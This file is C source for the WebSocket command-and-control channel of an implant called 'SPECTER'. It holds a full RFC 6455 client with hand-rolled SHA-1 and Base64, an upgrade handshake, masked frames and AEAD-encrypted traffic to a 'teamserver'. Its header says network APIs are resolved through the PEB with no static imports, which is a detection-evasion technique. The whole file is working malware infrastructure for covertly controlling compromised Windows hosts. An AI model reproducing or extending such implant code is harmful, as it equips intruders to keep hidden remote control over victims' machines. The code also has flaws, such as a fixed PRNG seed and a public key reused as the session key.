/**
 * SPECTER Implant — WebSocket Communications Channel
 *
 * RFC 6455 WebSocket client over TLS (WSS) via existing SChannel
 * infrastructure.  HTTP Upgrade handshake with Sec-WebSocket-Key
 * verification, binary/text frame construction with client masking,
 * ping/pong handling, and close frame negotiation.
 * All network I/O through PEB-resolved APIs — no static imports.
 */

/* Phase 1+ channel implementation. Fully coded but not dispatched from
   the main comms_checkin path. Integration requires Phase 1.1 channel
   abstraction (see roadmap.md). */

#include "specter.h"
#include "ntdefs.h"
#include "peb.h"
#include "crypto.h"
#include "config.h"
#include "comms.h"
#include "comms_ws.h"
#include "util.h"

/* ------------------------------------------------------------------ */
/*  Static state                                                       */
/* ------------------------------------------------------------------ */

static WS_CONTEXT g_ws_ctx;

/* ------------------------------------------------------------------ */
/*  Internal helpers                                                   */
/* ------------------------------------------------------------------ */

static void store32_le_ws(BYTE *p, DWORD v) {
    p[0] = (BYTE)(v);
    p[1] = (BYTE)(v >> 8);
    p[2] = (BYTE)(v >> 16);
    p[3] = (BYTE)(v >> 24);
}

static void store16_be_ws(BYTE *p, WORD v) {
    p[0] = (BYTE)(v >> 8);
    p[1] = (BYTE)(v);
}

static WORD load16_be_ws(const BYTE *p) {
    return (WORD)((WORD)p[0] << 8 | (WORD)p[1]);
}

/* Simple PRNG (xorshift32) for masking key generation */
static DWORD ws_prng_next(WS_CONTEXT *ctx) {
    DWORD x = ctx->prng_state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    ctx->prng_state = x;
    return x;
}

/* String length helper */
static DWORD ws_strlen(const char *s) {
    DWORD len = 0;
    while (s[len]) len++;
    return len;
}

/* String copy helper, returns chars copied */
__attribute__((unused))
static DWORD ws_strcpy(char *dst, const char *src, DWORD max_len) {
    DWORD i = 0;
    while (src[i] && i < max_len - 1) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = '\0';
    return i;
}

/* Case-insensitive string search (find needle in haystack) */
static const char *ws_strcasestr(const char *haystack, const char *needle) {
    if (!haystack || !needle) return NULL;
    DWORD nlen = ws_strlen(needle);
    if (nlen == 0) return haystack;

    for (DWORD i = 0; haystack[i]; i++) {
        BOOL match = TRUE;
        for (DWORD j = 0; j < nlen; j++) {
            char h = haystack[i + j];
            char n = needle[j];
            if (!h) return NULL;
            /* Lowercase comparison */
            if (h >= 'A' && h <= 'Z') h += 32;
            if (n >= 'A' && n <= 'Z') n += 32;
            if (h != n) { match = FALSE; break; }
        }
        if (match) return &haystack[i];
    }
    return NULL;
}

/* Find a header value in HTTP response */
static BOOL ws_find_header_value(const char *response, const char *header_name,
                                  char *value_out, DWORD value_out_len) {
    const char *pos = ws_strcasestr(response, header_name);
    if (!pos) return FALSE;

    /* Skip header name */
    pos += ws_strlen(header_name);
    /* Skip ": " */
    while (*pos == ':' || *pos == ' ') pos++;

    DWORD i = 0;
    while (pos[i] && pos[i] != '\r' && pos[i] != '\n' && i < value_out_len - 1) {
        value_out[i] = pos[i];
        i++;
    }
    value_out[i] = '\0';
    return (i > 0);
}

/* ------------------------------------------------------------------ */
/*  SHA-1 implementation (RFC 3174) — for Sec-WebSocket-Accept only    */
/* ------------------------------------------------------------------ */

/* SHA-1 round constants */
#define SHA1_K0 0x5A827999
#define SHA1_K1 0x6ED9EBA1
#define SHA1_K2 0x8F1BBCDC
#define SHA1_K3 0xCA62C1D6

static DWORD sha1_rotl(DWORD x, int n) {
    return (x << n) | (x >> (32 - n));
}

void ws_sha1_init(WS_SHA1_CTX *ctx) {
    ctx->state[0] = 0x67452301;
    ctx->state[1] = 0xEFCDAB89;
    ctx->state[2] = 0x98BADCFE;
    ctx->state[3] = 0x10325476;
    ctx->state[4] = 0xC3D2E1F0;
    ctx->count = 0;
    ctx->buf_len = 0;
    spec_memset(ctx->buffer, 0, WS_SHA1_BLOCK_SIZE);
}

static void sha1_transform(DWORD state[5], const BYTE block[64]) {
    DWORD w[80];
    DWORD a, b, c, d, e, f, k, temp;

    /* Expand 16 words to 80 */
    for (int i = 0; i < 16; i++) {
        w[i] = ((DWORD)block[i * 4] << 24) |
               ((DWORD)block[i * 4 + 1] << 16) |
               ((DWORD)block[i * 4 + 2] << 8) |
               ((DWORD)block[i * 4 + 3]);
    }
    for (int i = 16; i < 80; i++) {
        w[i] = sha1_rotl(w[i-3] ^ w[i-8] ^ w[i-14] ^ w[i-16], 1);
    }

    a = state[0]; b = state[1]; c = state[2];
    d = state[3]; e = state[4];

    for (int i = 0; i < 80; i++) {
        if (i < 20) {
            f = (b & c) | ((~b) & d);
            k = SHA1_K0;
        } else if (i < 40) {
            f = b ^ c ^ d;
            k = SHA1_K1;
        } else if (i < 60) {
            f = (b & c) | (b & d) | (c & d);
            k = SHA1_K2;
        } else {
            f = b ^ c ^ d;
            k = SHA1_K3;
        }

        temp = sha1_rotl(a, 5) + f + e + k + w[i];
        e = d; d = c;
        c = sha1_rotl(b, 30);
        b = a; a = temp;
    }

    state[0] += a; state[1] += b; state[2] += c;
    state[3] += d; state[4] += e;
}

void ws_sha1_update(WS_SHA1_CTX *ctx, const BYTE *data, DWORD len) {
    for (DWORD i = 0; i < len; i++) {
        ctx->buffer[ctx->buf_len++] = data[i];
        ctx->count++;
        if (ctx->buf_len == WS_SHA1_BLOCK_SIZE) {
            sha1_transform(ctx->state, ctx->buffer);
            ctx->buf_len = 0;
        }
    }
}

void ws_sha1_final(WS_SHA1_CTX *ctx, BYTE digest[WS_SHA1_DIGEST_SIZE]) {
    QWORD bit_count = ctx->count * 8;

    /* Pad with 0x80 then zeros */
    ctx->buffer[ctx->buf_len++] = 0x80;

    if (ctx->buf_len > 56) {
        while (ctx->buf_len < WS_SHA1_BLOCK_SIZE)
            ctx->buffer[ctx->buf_len++] = 0;
        sha1_transform(ctx->state, ctx->buffer);
        ctx->buf_len = 0;
    }

    while (ctx->buf_len < 56)
        ctx->buffer[ctx->buf_len++] = 0;

    /* Append bit length in big-endian */
    ctx->buffer[56] = (BYTE)(bit_count >> 56);
    ctx->buffer[57] = (BYTE)(bit_count >> 48);
    ctx->buffer[58] = (BYTE)(bit_count >> 40);
    ctx->buffer[59] = (BYTE)(bit_count >> 32);
    ctx->buffer[60] = (BYTE)(bit_count >> 24);
    ctx->buffer[61] = (BYTE)(bit_count >> 16);
    ctx->buffer[62] = (BYTE)(bit_count >> 8);
    ctx->buffer[63] = (BYTE)(bit_count);

    sha1_transform(ctx->state, ctx->buffer);

    /* Output digest in big-endian */
    for (int i = 0; i < 5; i++) {
        digest[i * 4]     = (BYTE)(ctx->state[i] >> 24);
        digest[i * 4 + 1] = (BYTE)(ctx->state[i] >> 16);
        digest[i * 4 + 2] = (BYTE)(ctx->state[i] >> 8);
        digest[i * 4 + 3] = (BYTE)(ctx->state[i]);
    }
}

/* ------------------------------------------------------------------ */
/*  Base64 encoding/decoding (standard alphabet, with padding)         */
/* ------------------------------------------------------------------ */

/* util_b64_table and util_b64_decode_char provided by util.h */

DWORD ws_base64_encode(const BYTE *data, DWORD data_len,
                       char *output, DWORD output_len) {
    if (!data || !output || output_len == 0)
        return 0;

    DWORD needed = ((data_len + 2) / 3) * 4;
    if (needed + 1 > output_len)
        return 0;

    DWORD out_pos = 0;
    DWORD i = 0;

    while (i < data_len) {
        DWORD remaining = data_len - i;
        BYTE b0 = data[i];
        BYTE b1 = (remaining > 1) ? data[i + 1] : 0;
        BYTE b2 = (remaining > 2) ? data[i + 2] : 0;

        output[out_pos++] = util_b64_table[(b0 >> 2) & 0x3F];
        output[out_pos++] = util_b64_table[((b0 & 0x03) << 4) | ((b1 >> 4) & 0x0F)];

        if (remaining > 1)
            output[out_pos++] = util_b64_table[((b1 & 0x0F) << 2) | ((b2 >> 6) & 0x03)];
        else
            output[out_pos++] = '=';

        if (remaining > 2)
            output[out_pos++] = util_b64_table[b2 & 0x3F];
        else
            output[out_pos++] = '=';

        i += 3;
    }

    output[out_pos] = '\0';
    return out_pos;
}

/* b64_decode_char provided by util.h as util_b64_decode_char */

DWORD ws_base64_decode(const char *input, DWORD input_len,
                       BYTE *output, DWORD output_len) {
    if (!input || !output || output_len == 0)
        return 0;

    /* Skip padding from length calculation */
    DWORD pad = 0;
    if (input_len > 0 && input[input_len - 1] == '=') pad++;
    if (input_len > 1 && input[input_len - 2] == '=') pad++;

    DWORD out_pos = 0;
    DWORD i = 0;

    while (i + 3 < input_len) {
        int a = util_b64_decode_char(input[i]);
        int b = util_b64_decode_char(input[i + 1]);
        int c_val = util_b64_decode_char(input[i + 2]);
        int d = util_b64_decode_char(input[i + 3]);

        if (a < 0 || b < 0) break;

        if (out_pos < output_len)
            output[out_pos++] = (BYTE)((a << 2) | (b >> 4));

        if (c_val >= 0 && out_pos < output_len)
            output[out_pos++] = (BYTE)(((b & 0x0F) << 4) | (c_val >> 2));

        if (d >= 0 && out_pos < output_len)
            output[out_pos++] = (BYTE)(((c_val & 0x03) << 6) | d);

        i += 4;
    }

    return out_pos;
}

/* ------------------------------------------------------------------ */
/*  WebSocket key generation and accept computation                    */
/* ------------------------------------------------------------------ */

/* RFC 6455 GUID for Sec-WebSocket-Accept computation */
static const char ws_guid[] = "258EAFA5-E914-47DA-95CA-5AB5DC4BBE18";

void ws_generate_key(WS_CONTEXT *ctx) {
    /* Generate 16 random bytes using PRNG */
    for (DWORD i = 0; i < WS_KEY_RAW_SIZE; i++) {
        if ((i % 4) == 0) {
            DWORD r = ws_prng_next(ctx);
            ctx->ws_key_raw[i] = (BYTE)(r);
        } else {
            ctx->ws_key_raw[i] = (BYTE)(ws_prng_next(ctx));
        }
    }

    /* Base64-encode the key */
    ws_base64_encode(ctx->ws_key_raw, WS_KEY_RAW_SIZE,
                     ctx->ws_key_b64, sizeof(ctx->ws_key_b64));

    /* Compute expected Sec-WebSocket-Accept:
     * SHA-1(base64key + GUID), then base64-encode result */
    WS_SHA1_CTX sha1;
    ws_sha1_init(&sha1);
    ws_sha1_update(&sha1, (const BYTE *)ctx->ws_key_b64,
                   ws_strlen(ctx->ws_key_b64));
    ws_sha1_update(&sha1, (const BYTE *)ws_guid, ws_strlen(ws_guid));

    BYTE digest[WS_SHA1_DIGEST_SIZE];
    ws_sha1_final(&sha1, digest);

    ws_base64_encode(digest, WS_SHA1_DIGEST_SIZE,
                     ctx->expected_accept, sizeof(ctx->expected_accept));
}

/* ------------------------------------------------------------------ */
/*  WebSocket frame construction/parsing                               */
/* ------------------------------------------------------------------ */

void ws_apply_mask(BYTE *data, DWORD data_len, const BYTE mask_key[4]) {
    for (DWORD i = 0; i < data_len; i++) {
        data[i] ^= mask_key[i % 4];
    }
}

DWORD ws_build_frame(WS_CONTEXT *ctx, BYTE opcode, BOOL fin,
                     const BYTE *payload, DWORD payload_len,
                     BYTE *output, DWORD output_len) {
    if (!output || output_len == 0)
        return 0;

    /* Calculate header size:
     * 2 bytes base header
     * + 0/2/8 bytes extended payload length
     * + 4 bytes masking key (always for client) */
    DWORD header_size = 2 + WS_MASKING_KEY_SIZE;
    if (payload_len > 65535)
        header_size += 8;
    else if (payload_len > 125)
        header_size += 2;

    DWORD total = header_size + payload_len;
    if (total > output_len)
        return 0;

    DWORD pos = 0;

    /* Byte 0: FIN + opcode */
    output[pos++] = (fin ? WS_FIN_BIT : 0) | (opcode & WS_OPCODE_MASK);

    /* Byte 1: MASK bit + payload length */
    if (payload_len <= 125) {
        output[pos++] = WS_MASK_BIT | (BYTE)payload_len;
    } else if (payload_len <= 65535) {
        output[pos++] = WS_MASK_BIT | 126;
        store16_be_ws(output + pos, (WORD)payload_len);
        pos += 2;
    } else {
        output[pos++] = WS_MASK_BIT | 127;
        /* 64-bit extended payload length (big-endian) */
        spec_memset(output + pos, 0, 4); /* Upper 32 bits = 0 */
        pos += 4;
        output[pos++] = (BYTE)(payload_len >> 24);
        output[pos++] = (BYTE)(payload_len >> 16);
        output[pos++] = (BYTE)(payload_len >> 8);
        output[pos++] = (BYTE)(payload_len);
    }

    /* Masking key (4 random bytes) */
    DWORD mask_val = ws_prng_next(ctx);
    BYTE mask_key[WS_MASKING_KEY_SIZE];
    mask_key[0] = (BYTE)(mask_val);
    mask_key[1] = (BYTE)(mask_val >> 8);
    mask_key[2] = (BYTE)(mask_val >> 16);
    mask_key[3] = (BYTE)(mask_val >> 24);

    spec_memcpy(output + pos, mask_key, WS_MASKING_KEY_SIZE);
    pos += WS_MASKING_KEY_SIZE;

    /* Copy payload and apply mask */
    if (payload && payload_len > 0) {
        spec_memcpy(output + pos, payload, payload_len);
        ws_apply_mask(output + pos, payload_len, mask_key);
    }

    return total;
}

DWORD ws_parse_frame(const BYTE *wire_data, DWORD wire_len,
                     WS_FRAME *frame) {
    if (!wire_data || !frame || wire_len < 2)
        return 0;

    spec_memset(frame, 0, sizeof(*frame));

    DWORD pos = 0;

    /* Byte 0: FIN + opcode */
    frame->fin = (wire_data[pos] & WS_FIN_BIT) ? TRUE : FALSE;
    frame->opcode = wire_data[pos] & WS_OPCODE_MASK;
    pos++;

    /* Byte 1: MASK + payload length */
    frame->masked = (wire_data[pos] & WS_MASK_BIT) ? TRUE : FALSE;
    DWORD payload_len = wire_data[pos] & 0x7F;
    pos++;

    /* Extended payload length */
    if (payload_len == 126) {
        if (wire_len < pos + 2) return 0;
        payload_len = load16_be_ws(wire_data + pos);
        pos += 2;
    } else if (payload_len == 127) {
        if (wire_len < pos + 8) return 0;
        /* Only use lower 32 bits (upper must be 0 for sane payloads) */
        payload_len = ((DWORD)wire_data[pos + 4] << 24) |
                      ((DWORD)wire_data[pos + 5] << 16) |
                      ((DWORD)wire_data[pos + 6] << 8) |
                      ((DWORD)wire_data[pos + 7]);
        pos += 8;
    }

    frame->payload_len = payload_len;

    /* Masking key (if present) */
    if (frame->masked) {
        if (wire_len < pos + 4) return 0;
        spec_memcpy(frame->mask_key, wire_data + pos, 4);
        pos += 4;
    }

    /* Payload */
    if (wire_len < pos + payload_len)
        return 0;

    frame->payload = (BYTE *)(wire_data + pos);
    pos += payload_len;

    return pos;
}

/* ------------------------------------------------------------------ */
/*  WebSocket handshake construction/validation                        */
/* ------------------------------------------------------------------ */

DWORD ws_build_upgrade_request(WS_CONTEXT *ctx, const char *host,
                               const char *path,
                               BYTE *output, DWORD output_len) {
    if (!ctx || !host || !path || !output || output_len == 0)
        return 0;

    /* Build:
     * GET <path> HTTP/1.1\r\n
     * Host: <host>\r\n
     * Upgrade: websocket\r\n
     * Connection: Upgrade\r\n
     * Sec-WebSocket-Key: <base64key>\r\n
     * Sec-WebSocket-Version: 13\r\n
     * \r\n
     */
    DWORD pos = 0;

#define WS_APPEND(str) do { \
    DWORD slen = ws_strlen(str); \
    if (pos + slen > output_len) return 0; \
    spec_memcpy(output + pos, str, slen); \
    pos += slen; \
} while(0)

    WS_APPEND("GET ");
    WS_APPEND(path);
    WS_APPEND(" HTTP/1.1\r\nHost: ");
    WS_APPEND(host);
    WS_APPEND("\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ");
    WS_APPEND(ctx->ws_key_b64);
    WS_APPEND("\r\nSec-WebSocket-Version: 13\r\n\r\n");

#undef WS_APPEND

    return pos;
}

BOOL ws_validate_upgrade_response(WS_CONTEXT *ctx,
                                  const BYTE *response, DWORD response_len) {
    if (!ctx || !response || response_len < 12)
        return FALSE;

    /* Check for "HTTP/1.1 101" status line */
    const char *resp = (const char *)response;

    /* Verify 101 status code */
    if (!ws_strcasestr(resp, "101"))
        return FALSE;

    /* Verify "Upgrade: websocket" header */
    if (!ws_strcasestr(resp, "Upgrade"))
        return FALSE;

    /* Extract and verify Sec-WebSocket-Accept */
    char accept_value[64];
    spec_memset(accept_value, 0, sizeof(accept_value));

    if (!ws_find_header_value(resp, "Sec-WebSocket-Accept", accept_value, sizeof(accept_value)))
        return FALSE;

    /* Compare with expected value */
    DWORD expected_len = ws_strlen(ctx->expected_accept);
    DWORD actual_len = ws_strlen(accept_value);

    if (expected_len != actual_len)
        return FALSE;

    if (spec_memcmp(ctx->expected_accept, accept_value, expected_len) != 0)
        return FALSE;

    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  Channel interface                                                  */
/* ------------------------------------------------------------------ */

NTSTATUS ws_connect(IMPLANT_CONTEXT *ctx) {
    if (!ctx || !ctx->config) return STATUS_INVALID_PARAMETER;

    WS_CONTEXT *ws = &g_ws_ctx;
    spec_memset(ws, 0, sizeof(*ws));
    ws->ws_state = WS_STATE_DISCONNECTED;
    ws->state = COMMS_STATE_DISCONNECTED;

    /* Initialize PRNG from implant context */
    ws->prng_state = 0xDEADBEEF;

    IMPLANT_CONFIG *cfg = cfg_get(ctx);
    if (!cfg) return STATUS_UNSUCCESSFUL;

    /* Find WebSocket channel config */
    CHANNEL_CONFIG *ch = NULL;
    for (DWORD i = 0; i < cfg->channel_count; i++) {
        if (cfg->channels[i].type == CHANNEL_WEBSOCKET && cfg->channels[i].active) {
            ch = &cfg->channels[i];
            break;
        }
    }
    if (!ch) return STATUS_OBJECT_NAME_NOT_FOUND;

    /* Copy session key for encryption */
    spec_memcpy(ws->session_key, cfg->teamserver_pubkey, 32);

#ifndef TEST_BUILD
    /* TCP connect */
    NTSTATUS status = comms_tcp_connect(&ws->tls, ch->url, ch->port);
    if (!NT_SUCCESS(status)) {
        ws->ws_state = WS_STATE_ERROR;
        return status;
    }
    ws->ws_state = WS_STATE_TCP_CONNECTED;

    /* TLS handshake */
    status = comms_tls_init(&ws->tls);
    if (!NT_SUCCESS(status)) {
        comms_tcp_close(&ws->tls);
        ws->ws_state = WS_STATE_ERROR;
        return status;
    }

    status = comms_tls_handshake(&ws->tls, ch->url);
    if (!NT_SUCCESS(status)) {
        comms_tcp_close(&ws->tls);
        ws->ws_state = WS_STATE_ERROR;
        return status;
    }
    ws->ws_state = WS_STATE_TLS_CONNECTED;

    /* WebSocket handshake */
    ws_generate_key(ws);

    DWORD req_len = ws_build_upgrade_request(ws, ch->url, "/ws",
                                              ws->handshake_buf,
                                              WS_HANDSHAKE_BUF_SIZE);
    if (req_len == 0) {
        comms_tls_close(&ws->tls);
        ws->ws_state = WS_STATE_ERROR;
        return STATUS_UNSUCCESSFUL;
    }

    status = comms_tls_send(&ws->tls, ws->handshake_buf, req_len);
    if (!NT_SUCCESS(status)) {
        comms_tls_close(&ws->tls);
        ws->ws_state = WS_STATE_ERROR;
        return status;
    }

    /* Read upgrade response */
    DWORD received = 0;
    status = comms_tls_recv(&ws->tls, ws->handshake_buf,
                            WS_HANDSHAKE_BUF_SIZE - 1, &received);
    if (!NT_SUCCESS(status) || received == 0) {
        comms_tls_close(&ws->tls);
        ws->ws_state = WS_STATE_ERROR;
        return STATUS_UNSUCCESSFUL;
    }
    ws->handshake_buf[received] = 0;

    if (!ws_validate_upgrade_response(ws, ws->handshake_buf, received)) {
        comms_tls_close(&ws->tls);
        ws->ws_state = WS_STATE_ERROR;
        return STATUS_UNSUCCESSFUL;
    }

    ws->ws_state = WS_STATE_UPGRADED;
#endif

    ws->state = COMMS_STATE_REGISTERED;
    return STATUS_SUCCESS;
}

NTSTATUS ws_send(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len) {
    if (!ctx || !data || len == 0) return STATUS_INVALID_PARAMETER;

    WS_CONTEXT *ws = &g_ws_ctx;
    if (ws->state < COMMS_STATE_REGISTERED)
        return STATUS_UNSUCCESSFUL;

    /* Encrypt data with AEAD first */
    BYTE nonce[AEAD_NONCE_SIZE];
    spec_memset(nonce, 0, AEAD_NONCE_SIZE);
    store32_le_ws(nonce, ws->msg_seq);

    /* Build AEAD payload: [12-byte nonce][ciphertext][16-byte tag] */
    DWORD aead_len = AEAD_NONCE_SIZE + len + AEAD_TAG_SIZE;
    if (aead_len > WS_SEND_BUF_SIZE - WS_MAX_FRAME_HEADER)
        return STATUS_BUFFER_TOO_SMALL;

    BYTE aead_buf[WS_SEND_BUF_SIZE];
    spec_memcpy(aead_buf, nonce, AEAD_NONCE_SIZE);
    spec_memcpy(aead_buf + AEAD_NONCE_SIZE, data, len);

    BYTE tag[AEAD_TAG_SIZE];
    spec_aead_encrypt(
        ws->session_key,
        nonce,
        aead_buf + AEAD_NONCE_SIZE,
        len,
        NULL, 0,
        aead_buf + AEAD_NONCE_SIZE,
        tag
    );
    spec_memcpy(aead_buf + AEAD_NONCE_SIZE + len, tag, AEAD_TAG_SIZE);

    ws->msg_seq++;

    /* Build binary WebSocket frame */
    DWORD frame_len = ws_build_frame(ws, WS_OPCODE_BINARY, TRUE,
                                      aead_buf, aead_len,
                                      ws->send_buf, WS_SEND_BUF_SIZE);
    if (frame_len == 0) return STATUS_BUFFER_TOO_SMALL;

#ifndef TEST_BUILD
    NTSTATUS status = comms_tls_send(&ws->tls, ws->send_buf, frame_len);
    return status;
#else
    return STATUS_SUCCESS;
#endif
}

NTSTATUS ws_recv(IMPLANT_CONTEXT *ctx, BYTE *data_out, DWORD *data_len) {
    if (!ctx || !data_out || !data_len || *data_len == 0)
        return STATUS_INVALID_PARAMETER;

    WS_CONTEXT *ws = &g_ws_ctx;
    if (ws->state < COMMS_STATE_REGISTERED)
        return STATUS_UNSUCCESSFUL;

#ifndef TEST_BUILD
    /* Read data from TLS */
    DWORD received = 0;
    NTSTATUS status = comms_tls_recv(&ws->tls, ws->recv_buf,
                                      WS_RECV_BUF_SIZE, &received);
    if (!NT_SUCCESS(status) || received == 0) {
        *data_len = 0;
        return status;
    }

    /* Parse frame */
    WS_FRAME frame;
    DWORD consumed = ws_parse_frame(ws->recv_buf, received, &frame);
    if (consumed == 0) {
        *data_len = 0;
        return STATUS_UNSUCCESSFUL;
    }

    /* Handle control frames transparently */
    if (frame.opcode == WS_OPCODE_PING) {
        /* Reply with pong */
        DWORD pong_len = ws_build_frame(ws, WS_OPCODE_PONG, TRUE,
                                         frame.payload, frame.payload_len,
                                         ws->send_buf, WS_SEND_BUF_SIZE);
        if (pong_len > 0)
            comms_tls_send(&ws->tls, ws->send_buf, pong_len);

        *data_len = 0;
        return STATUS_SUCCESS;
    }

    if (frame.opcode == WS_OPCODE_CLOSE) {
        ws->ws_state = WS_STATE_CLOSING;
        *data_len = 0;
        return STATUS_CONNECTION_RESET;
    }

    /* Unmask server data if masked (servers usually don't mask) */
    if (frame.masked)
        ws_apply_mask(frame.payload, frame.payload_len, frame.mask_key);

    /* Decrypt AEAD payload: [12-byte nonce][ciphertext][16-byte tag] */
    if (frame.payload_len < AEAD_NONCE_SIZE + AEAD_TAG_SIZE) {
        *data_len = 0;
        return STATUS_UNSUCCESSFUL;
    }

    const BYTE *nonce = frame.payload;
    const BYTE *ciphertext = nonce + AEAD_NONCE_SIZE;
    DWORD ct_len = frame.payload_len - AEAD_NONCE_SIZE - AEAD_TAG_SIZE;
    const BYTE *tag = ciphertext + ct_len;

    if (ct_len > *data_len) {
        *data_len = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    spec_memcpy(data_out, ciphertext, ct_len);

    BOOL ok = spec_aead_decrypt(ws->session_key, nonce,
                                 data_out, ct_len,
                                 NULL, 0, data_out, tag);
    if (!ok) {
        spec_memset(data_out, 0, ct_len);
        *data_len = 0;
        return STATUS_UNSUCCESSFUL;
    }

    *data_len = ct_len;
    return STATUS_SUCCESS;
#else
    (void)ctx;
    (void)data_out;
    *data_len = 0;
    return STATUS_SUCCESS;
#endif
}

NTSTATUS ws_disconnect(IMPLANT_CONTEXT *ctx) {
    (void)ctx;
    WS_CONTEXT *ws = &g_ws_ctx;

#ifndef TEST_BUILD
    /* Send close frame */
    if (ws->ws_state == WS_STATE_UPGRADED) {
        BYTE close_payload[2];
        store16_be_ws(close_payload, WS_CLOSE_NORMAL);

        DWORD frame_len = ws_build_frame(ws, WS_OPCODE_CLOSE, TRUE,
                                          close_payload, 2,
                                          ws->send_buf, WS_SEND_BUF_SIZE);
        if (frame_len > 0)
            comms_tls_send(&ws->tls, ws->send_buf, frame_len);
    }

    comms_tls_close(&ws->tls);
#endif

    ws->ws_state = WS_STATE_DISCONNECTED;
    ws->state = COMMS_STATE_DISCONNECTED;
    spec_memset(ws->session_key, 0, sizeof(ws->session_key));
    ws->msg_seq = 0;

    return STATUS_SUCCESS;
}

NTSTATUS ws_health_check(IMPLANT_CONTEXT *ctx) {
    if (!ctx) return STATUS_INVALID_PARAMETER;

    WS_CONTEXT *ws = &g_ws_ctx;
    if (ws->state < COMMS_STATE_REGISTERED)
        return STATUS_UNSUCCESSFUL;

#ifndef TEST_BUILD
    /* Send ping frame with small payload */
    BYTE ping_data[4] = { 0x53, 0x50, 0x45, 0x43 }; /* "SPEC" */
    DWORD frame_len = ws_build_frame(ws, WS_OPCODE_PING, TRUE,
                                      ping_data, 4,
                                      ws->send_buf, WS_SEND_BUF_SIZE);
    if (frame_len == 0) return STATUS_UNSUCCESSFUL;

    NTSTATUS status = comms_tls_send(&ws->tls, ws->send_buf, frame_len);
    if (!NT_SUCCESS(status)) return status;

    /* Read pong response */
    DWORD received = 0;
    status = comms_tls_recv(&ws->tls, ws->recv_buf,
                            WS_RECV_BUF_SIZE, &received);
    if (!NT_SUCCESS(status) || received == 0)
        return STATUS_UNSUCCESSFUL;

    WS_FRAME frame;
    DWORD consumed = ws_parse_frame(ws->recv_buf, received, &frame);
    if (consumed == 0 || frame.opcode != WS_OPCODE_PONG)
        return STATUS_UNSUCCESSFUL;

    return STATUS_SUCCESS;
#else
    return STATUS_SUCCESS;
#endif
}

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
WS_CONTEXT *ws_get_context(void) {
    return &g_ws_ctx;
}

void ws_test_set_prng_seed(WS_CONTEXT *ctx, DWORD seed) {
    if (ctx) ctx->prng_state = seed;
}

void ws_test_reset_context(WS_CONTEXT *ctx) {
    if (!ctx) return;
    spec_memset(ctx, 0, sizeof(*ctx));
    ctx->ws_state = WS_STATE_DISCONNECTED;
    ctx->state = COMMS_STATE_DISCONNECTED;
}
#endif
